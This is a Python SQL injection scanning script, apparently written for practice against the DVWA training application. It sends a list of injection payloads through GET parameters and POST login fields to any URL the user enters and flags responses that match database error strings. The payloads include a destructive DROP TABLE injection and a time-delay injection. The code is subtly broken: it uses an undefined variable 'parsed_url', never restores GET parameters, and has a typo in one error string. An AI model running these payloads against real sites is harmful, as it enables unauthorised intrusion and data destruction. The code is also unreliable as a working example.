import requests
from urllib.parse import urlparse, parse_qs, urlencode


#List of common sql payloads
sql_payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "\" OR \"\" = \"",
    "' OR '' = '",
    "' OR 1=1#",
    "admin' --",
    "' OR 'a'='a",
    "' AND 1=0 --",
    "' UNION SELECT NULL, NULL --",
    "'; WAITFOR DELAY '0:0:5' --",
]

#List of common sql errors
sql_errors = [
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "Unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "SQLSTATE",
    "ODBC",
    "Microsoft JET Database",
    "ORA-00933",
    "Microsoft OLE D8 provider for SQL Server",
    "Syntax error",
]

#Function responsible for testing for SQLi
def test_sql_injection(url, method="GET", data=None):
    print(f"[*] Testing target: {url}")
    
    vulnerable = False
    
    #Checking every payload we specified
    for payload in sql_payloads:
       #Testing with GET
        if method.upper() == "GET":
            #Changig URL to dictionary containing its parameters
            parsed = urlparse(url) 
            query = parse_qs(parsed_url.query) 
            #Checking parameters of GET
            for param in query:
                #Saving original parameter
                original = query[param][0]
                #Changing parameter to test SQLi
                query[param][0] = payload
                #Encoding the payload in URL
                new_query = urlencode(query, doseq=True) 
                new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                #Sending get request
                response = requests.get(new_url)
                #Checking if payload worked, if it is then making variable vulnerable True
                if any(error in response.text for error in sql_errors):
                    print(f"Probable vulnerability in '{param}' using payload: {payload}")
                    vulnerable = True
       #Testing with POST
        elif method.upper() == "POST" and data:            
            for param in data:
                #Saving original parameter
                original = data[param]
                data[param] = payload 
                #Sending post request
                response = requests.post(url, data=data, allow_redirects=True)

                #Modification required for working with DVWA, usually we would use sql_errors list
                if "Welcome" in response.text or "DVWA" in response.text:
                    print(f"Probable vulnerability in '{param}' using payload: {payload}")
                    vulnerable = True
                data[param] = original
        else:
            print("[!] Wrong method or lack of data")
            return
    
    if not vulnerable:
        print("No obvious vulnerabilities")

#Main loop
while True:
    choice = input("\nChoose method GET/POST, or exit: g/p/x ")
    if choice == "g":
        url = input("Provide url you want to test: ")
        test_sql_injection(f"{url}", method="GET")
    elif choice == "p":
        url = input("Provide url you want to test: ")
        post_data = {"username": "test", "password": "test"}
        test_sql_injection(f"{url}", method="POST", data=post_data)
    elif choice == "x":
        break
    else:
        print("Wrong choice")



    
